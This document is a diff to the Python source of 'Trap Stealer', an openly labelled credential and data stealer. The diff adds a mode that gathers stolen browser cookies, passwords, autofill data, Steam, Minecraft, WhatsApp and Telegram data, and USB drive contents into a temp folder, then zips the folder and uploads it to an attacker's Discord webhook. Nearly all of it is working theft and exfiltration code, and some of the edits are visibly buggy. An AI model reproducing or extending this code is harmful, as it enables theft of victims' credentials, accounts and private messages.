@@ -21,6 +21,7 @@ import datetime
 
 
 webhook = '%WEBHOOK%'
+logfile = '%Logfile%'
 debug = '%Debug%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
@@ -75,16 +76,27 @@ except:
     from Crypto.Cipher import AES
     
 import requests
-
+        
 def error_Handler(err):
     if debug == True:
-        if '           ' in err:
-            pass
-        print(err)
+        def error_Handler(err):
+            if isinstance(err, TypeError):
+                print("An error occurred: TypeError -", err)
+            else:
+                print("An error occurred:", err)
+
         with open('error.txt', 'a')as f:
             f.write(f"{err}\n")
             
+def move_file_to_temp_folder(file_path):
+    temp_folder = os.path.join(os.environ['TEMP'], 'Logs')
+    os.makedirs(temp_folder, exist_ok=True)
     
+    try:
+        shutil.move(file_path, temp_folder)
+    except Exception as e:
+        error_Handler(e)
+           
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
     return conn
@@ -436,29 +448,33 @@ def steal_driver():
                             for filename in filenames:
                                 file_path = os.path.join(foldername, filename)
                                 zipf.write(file_path, arcname=os.path.relpath(file_path, f'{drive_letter}:\\'))
-                                
-                    upload = upload_file(zip_path)
                     
-                    data = {
-                
-                "username": "Trap Stealer",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-                "embeds": [
-                    {
-                        "title": "🍪 Trap Stealer USB Drivers",
-                        "description": f"USB Drivers Files\n{upload}",
-                        "color": 0xffb6c1,
-                        "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                        },
-                        "footer": {
-                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    if logfile == True:
+                        move_file_to_temp_folder()
+                    
+                    else:
+                        upload = upload_file(zip_path)
+                        
+                        data = {
+                    
+                    "username": "Trap Stealer",
+                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                    "embeds": [
+                        {
+                            "title": "🍪 Trap Stealer USB Drivers",
+                            "description": f"USB Drivers Files\n{upload}",
+                            "color": 0xffb6c1,
+                            "thumbnail": {
+                                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            },
+                            "footer": {
+                                "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            }
                         }
-                    }
-                ]
-            }
-                    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+                    ]
+                }
+                        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         except Exception as e:
             error_Handler(e)
             pass
@@ -492,36 +508,39 @@ def minecraft_sessions():
 
         if existing_files:
             create_zip_file(existing_files, zip_file_path)
-            file_url = upload_file(zip_file_path)
-            data = {
-                    "username": "Trap Stealer",
-                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-                    "embeds": [
-                        {
-                            "title": "Minecraft Session stealer",
-                            "description": f"All sessions files found!",
-                            "color": 0xffb6c1,
-                            "fields": [
-                                {"name": f"Minecraft sessions files", "value": f"[Click here to download]({file_url})"},
-                            ],
-                            "thumbnail": {
-                                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                            },
-                            "footer": {
-                                "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+            if logfile == True:
+                move_file_to_temp_folder(zip_file_path)
+            else:
+                file_url = upload_file(zip_file_path)
+                data = {
+                        "username": "Trap Stealer",
+                        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                        "embeds": [
+                            {
+                                "title": "Minecraft Session stealer",
+                                "description": f"All sessions files found!",
+                                "color": 0xffb6c1,
+                                "fields": [
+                                    {"name": f"Minecraft sessions files", "value": f"[Click here to download]({file_url})"},
+                                ],
+                                "thumbnail": {
+                                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                                },
+                                "footer": {
+                                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                                }
                             }
-                        }
-                    ]
-            }
+                        ]
+                }
 
-            headers = {
-                    "Content-Type": "application/json",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-            }
+                headers = {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                }
 
-            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-                    
+                LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+                        
         else:
             pass
     except Exception as e:
@@ -529,70 +548,75 @@ def minecraft_sessions():
         
     
 def ArchiSteamFarm():
-    def search_for_exe(filename, start_dir):
-        found_folders = []
-        for root, dirs, files in os.walk(start_dir):
-            for file in files:
-                if filename.lower() == file.lower():
-                    found_folders.append(root)
-                    break  
-        return found_folders
-
-        
-
-    def zip_config_folders(folders, base_zip_filename):
-        zip_filename = os.path.join(tempfile.gettempdir(), base_zip_filename + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)) + ".zip")
-        with zipfile.ZipFile(zip_filename, 'w') as zipf:
-            for folder in folders:
-                config_folder = os.path.join(folder, 'config')
-                if os.path.exists(config_folder):
-                    for root, dirs, files in os.walk(config_folder):
-                        for file in files:
-                            file_path = os.path.join(root, file)
-                            zipf.write(file_path, os.path.join('config', f'{folder}_{file}'))
-        return zip_filename
     try:
-        found_folders = search_for_exe("archisteamfarm.exe", os.path.join(os.path.expanduser('~'), 'Desktop'))
+        def search_for_exe(filename, start_dir):
+            found_folders = []
+            for root, dirs, files in os.walk(start_dir):
+                for file in files:
+                    if filename.lower() == file.lower():
+                        found_folders.append(root)
+                        break  
+            return found_folders
+
+            
+
+        def zip_config_folders(folders, base_zip_filename):
+            zip_filename = os.path.join(tempfile.gettempdir(), base_zip_filename + "_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)) + ".zip")
+            with zipfile.ZipFile(zip_filename, 'w') as zipf:
+                for folder in folders:
+                    config_folder = os.path.join(folder, 'config')
+                    if os.path.exists(config_folder):
+                        for root, dirs, files in os.walk(config_folder):
+                            for file in files:
+                                file_path = os.path.join(root, file)
+                                zipf.write(file_path, os.path.join('config', f'{folder}_{file}'))
+            return zip_filename
+        try:
+            found_folders = search_for_exe("archisteamfarm.exe", os.path.join(os.path.expanduser('~'), 'Desktop'))
+        except Exception as e:
+            error_Handler(e)
+            pass
+        
+        if found_folders:
+            try:
+                zip_filename = zip_config_folders(found_folders, "ArchiSteamFarmConf")
+                if logfile == True:
+                    move_file_to_temp_folder(zip_filename)
+                else:
+                    file_url = upload_file(zip_filename)
+                    data = {
+                            "username": "Trap Stealer",
+                            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                            "embeds": [
+                                {
+                                    "title": "ArchiSteamFarm Stealer",
+                                    "description": f"All config files found!",
+                                    "color": 0xffb6c1,
+                                    "fields": [
+                                        {"name": f"ArchiSteamFarm file", "value": f"[Click here to download]({file_url})"},
+                                    ],
+                                    "thumbnail": {
+                                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                                    },
+                                    "footer": {
+                                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                                    }
+                                }
+                            ]
+                    }
+
+                    headers = {
+                            "Content-Type": "application/json",
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                    }
+
+                    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+                
+            except Exception as e:
+                error_Handler(e)
     except Exception as e:
         error_Handler(e)
-        pass
-    
-    if found_folders:
-        try:
-            zip_filename = zip_config_folders(found_folders, "ArchiSteamFarmConf")
-            file_url = upload_file(zip_filename)
-            data = {
-                    "username": "Trap Stealer",
-                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-                    "embeds": [
-                        {
-                            "title": "ArchiSteamFarm Stealer",
-                            "description": f"All config files found!",
-                            "color": 0xffb6c1,
-                            "fields": [
-                                {"name": f"ArchiSteamFarm file", "value": f"[Click here to download]({file_url})"},
-                            ],
-                            "thumbnail": {
-                                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                            },
-                            "footer": {
-                                "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                            }
-                        }
-                    ]
-            }
-
-            headers = {
-                    "Content-Type": "application/json",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-            }
-
-            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-        
-        except Exception as e:
-                    error_Handler(e)
-
 
 def check_python_or_convert(file_path):
     _, file_extension = os.path.splitext(file_path)
@@ -943,6 +967,7 @@ def globalInfo():
 def antispam():
     file_path = os.path.join(os.getenv("TEMP"), "winlog.txt")
 
+    
     if os.path.exists(file_path):
         with open(file_path, "r") as file:
             saved_time = file.read().strip()
@@ -1099,9 +1124,7 @@ def UserInfo():
 
         with open(output_file_path, "w") as f:
             f.writelines(lines)
-            
-        
-            
+    
         return upload_file(output_file_path)
     except Exception as e:
         error_Handler(e)
@@ -1385,7 +1408,7 @@ def trap_exten():
                 clipboard_text = subprocess.check_output(['powershell.exe', 'Get-Clipboard'], shell=True, text=True)
                 return clipboard_text.strip()
             except subprocess.CalledProcessError as e:
-                print("Error:", e)
+
                 return None
 
         def send_to_web(webhookurl, text):
@@ -1949,6 +1972,7 @@ def brohist():
                     if os.path.exists(file_to_zip):
                         zipf.write(file_to_zip, os.path.basename(file_to_zip))
                         os.remove(file_to_zip)
+
     finally:
         for file_to_delete in files_to_zip:
             if os.path.exists(file_to_delete):
@@ -1958,6 +1982,10 @@ def histup():
     try:
         brohist()
         zip_file_name = os.path.join(os.path.expandvars('%temp%'), "browser.zip")
+        if logfile == True:
+            move_file_to_temp_folder(zip_file_name)
+            return
+        
         yrk = upload_file(zip_file_name)
         data = {
             
@@ -2135,6 +2163,9 @@ def steam_st():
             if os.path.exists(steam_path+"\\config"):
                 with zipfile.ZipFile(f"{os.environ['TEMP']}\\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                     steam(steam_path+"\\config",ssfn,zp)
+                
+                if logfile == True:
+                    move_file_to_temp_folder(f"{os.environ['TEMP']}\\steam_session.zip")
 
                 headers = {
             "Content-Type": "application/json",
@@ -2183,6 +2214,8 @@ def upload_files_to_discord():
             futures = []
             try:
                 for file_path in file_paths:
+                    if logfile == True:
+                        move_file_to_temp_folder(file_path)
                     futures.append(executor.submit(upload_file, file_path))
                 for future, file_path in zip(futures, file_paths):
                     url = future.result()
@@ -2331,9 +2364,13 @@ def Get_Whatsapp(base_directory, zip_file_path):
             with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for file_path in all_files:
                     zipf.write(file_path, os.path.relpath(file_path, base_directory))
+                    
+            if logfile == True:
+                move_file_to_temp_folder(zip_file_path) 
 
             return list_files_in_directory(base_directory, level=0, max_display=10), zip_file_path
         else:
+            move_file_to_temp_folder(zip_file_path)
             return "Too many files to display", zip_file_path
     except Exception as e:
         error_Handler(e)
@@ -2341,7 +2378,9 @@ def Get_Whatsapp(base_directory, zip_file_path):
 def Upload_Whatsapp():
     try:
         x, y = Get_Whatsapp(f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm", os.path.join(os.getenv("TEMP"), "winwlogs.zip"))
-            
+        if logfile == True:
+            move_file_to_temp_folder(y)
+            return
         url = upload_file(y)
 
 
@@ -2416,7 +2455,9 @@ def ZipTelegram(path, arg, procc):
             )]
             for file in files:
                 zf.write(f"{pathC}/{file}")
-
+        if logfile == True:
+            move_file_to_temp_folder(f'{pathC}/{name}.zip')
+            return
         lnik = upload_file(f'{pathC}/{name}.zip')
         os.remove(f"{pathC}/{name}.zip")
         OtherZip.append([arg, lnik])
@@ -2514,7 +2555,9 @@ def paaz(filetype):
         except:
             file = "Couldn't get cookies"
             filename = 'Error.txt'
-
+        if logfile == True:
+            move_file_to_temp_folder(file)
+            return
         s = upload_file(file)
         url_dict['cook'] = s
     
@@ -2526,25 +2569,26 @@ def paaz(filetype):
     if filetype == 'passw':
         try:
             file2 = os.getenv("TEMP") + fr"\wppassw.txt"
-            filename2 = "wppassw.txt"
         except:
             file2 = "Couldn't get passwords"
-            filename2 = 'Error.txt'
 
+        if logfile == True:
+            move_file_to_temp_folder(file2)
+            return
         ss = upload_file(file2)
         url_dict['passw'] = ss
 
     if filetype == 'autof':
         try:
             file3 = os.getenv("TEMP") + fr"\wpautofill.txt"
-            filename3 = "wpautofill.txt"
         except:
             file3 = "Couldn't get autofill"
-            filename3 = 'Error.txt'
-
+        if logfile == True:
+            move_file_to_temp_folder(file3)
+            return
         sss = upload_file(file3)
         url_dict['autof'] = sss
-        
+
     if filetype == 'uploooad':
         try:
             with open(os.getenv("TEMP") + fr"\wpcook.txt", 'r') as fp:
@@ -2553,6 +2597,8 @@ def paaz(filetype):
             CookiCount = 'error'
 
         try:
+            if logfile == True:
+                return
             data = {
                 "username": "Trap Stealer",
                 "content": "",
@@ -3385,7 +3431,54 @@ def getCook(path, arg, process):
             error_Handler(e)
     
 
-            
+def zip_temp_folder():
+    temp_folder = os.path.join(os.environ['TEMP'], 'Logs')
+    zip_file_path = os.path.join(os.environ['TEMP'], 'Logs.zip')
+
+    try:
+        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, _, files in os.walk(temp_folder):
+                for file in files:
+                    try:
+                        file_path = os.path.join(root, file)
+                        relative_path = os.path.relpath(file_path, temp_folder)
+                        zipf.write(file_path, relative_path)
+                    except:
+                        pass
+        url = upload_file(zip_file_path)
+        data = {
+                "username": "Trap Stealer",
+                "content": "",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "embeds": [
+                    {
+                        "title": f"🍪 Trap Stealer logs",
+                        "description": f"Here the logs\n[Click here to download]({url})",
+                        "color": 0xffb6c1,
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "footer": {
+                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        }
+                    }
+                ]
+            }
+        headers = {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+            }
+    
+    
+
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+        
+    except Exception as e:
+        error_Handler(e)
+        
+         
 def GatherZips(paths1, paths2, paths3):
     thttht = []
     try:
@@ -3686,7 +3779,15 @@ def gatha():
 
     for thread in First_Thread:
         thread.join()
+    
+    if logfile == True:
+        log = threading.Thread(target=zip_temp_folder)
+        log.start()
+        Second_Thread.append(log)
+        log.join()
         
+    for thread in Second_Thread:
+        thread.join()
     if crasher == True:
         crashs()
         
